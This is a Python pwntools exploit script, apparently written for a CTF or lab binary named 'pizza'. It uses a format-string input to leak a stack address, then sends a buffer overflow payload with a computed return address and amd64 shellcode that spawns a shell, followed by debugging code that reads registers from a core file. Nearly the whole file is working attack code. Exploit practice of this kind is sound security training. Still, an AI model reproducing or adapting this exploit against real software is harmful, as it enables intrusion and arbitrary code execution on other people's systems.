#!/usr/bin/env python3
from pwn import *

#context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

#getname_address = elf.symbols["getname"]

shellcode = asm(shellcraft.amd64.linux.sh())

#print(f"Shellcode: {shellcode.hex().upper()}")
#print(len(shellcode))

#exit()
input1 = b"Cantinflas %p %p %p %p %p %p %p"

victim = process("./pizza")

#memory leak
print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)
leak = str(victim.recvline(), "latin-1").split()[-1]
print(leak)
leak_int = int(leak,16)

#the pizza number prompt 
print(str(victim.recvline(), "latin-1"))
victim.sendline(b"10")

#get to card prompt 
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))

#by looking at our prints we can see shell at top of stack is +10 
#from our memory leak we want to put this in rip for the return
shellcodeplace = leak_int + 0x20

#the buffer overflow
#we need between 130 & 150 bytes
input2 =  b"A"*128 + b"ZZZZZZZZ"+ p64(shellcodeplace) + shellcode 
victim.sendline(input2)

print(str(victim.recvline(), "latin-1"))

#victim.sendline(payload)
victim.interactive()

#generate a core file to check key value
core = victim.corefile
rsp = core.rsp
rbp = core.rbp

rip = core.rip
#read at rsp 8 bytes,then at +8 rsp then at +8 that
topostack = core.read(rsp,8)
topostack_1 = core.read(rsp+8,8)
topostack_2 = core.read(rsp+16,8)

#gettin the memory adresses
print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")


print(f"Top of stack contains:{hex(int.from_bytes(topostack,'little'))}")
print(f"Top of stack +1 contains:{hex(int.from_bytes(topostack_1,'little'))}")
print(f"Top of stack +2 contains:{hex(int.from_bytes(topostack_2,'little'))}")
print(f"I think the shellcode is at:{hex(shellcodeplace)}")